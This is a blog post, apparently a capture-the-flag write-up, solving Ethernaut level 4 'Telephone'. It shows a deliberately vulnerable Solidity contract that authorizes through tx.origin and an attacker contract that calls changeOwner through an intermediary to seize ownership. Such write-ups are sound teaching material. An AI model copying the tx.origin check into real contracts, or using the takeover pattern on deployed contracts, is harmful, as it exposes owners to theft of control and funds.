---
layout: post
title: Ethernaut - 4.Telephone
date:  2022-08-27
tags: ethernaut solidity
---

## Difficulty: 🌕🌑🌑🌑🌑

> Claim ownership of the contract below to complete this level.<br />
  Things that might help<br /><br />
  See the Help page above, section "Beyond the console"

## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

## Writeup
To complete this level, we need to claim ownership of the contract. 
The keypoint is the difference between` tx.origin` and `msg.sender`.

![](https://i.imgur.com/ktsMFfo.png)
1. Get new instance
2. Create a contract 
    ``` solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    interface Telephone {
        function changeOwner(address _owner) external;
    }

    contract AttackTelephone {
        Telephone public targets = Telephone(YOUR_LEVEL_INSTANCE_ADDRESS);

        function attackTelephone() public{
            targets.changeOwner(YOUR_ACCOUNT);
        }
    }
    ```
3. Compile & deploy .
4. Call attackTelephone function. In this scenario, `tx.origin` will be the victim's address while `msg.sender` will be the malicious contract ( AttackTelephone ) 's address. ( `tx.origin != msg.sender` == `true` )
5. Callthe method 
    ``` solidity

    await contract.owner().then(v => v.toString())
    
    ```
    to check owner if it is your account.
6. Submit instance ξ( ✿＞◡❛)


## Reference
[tx.origin vs msg.sender](https://davidkathoh.medium.com/tx-origin-vs-msg-sender-93db7f234cb9)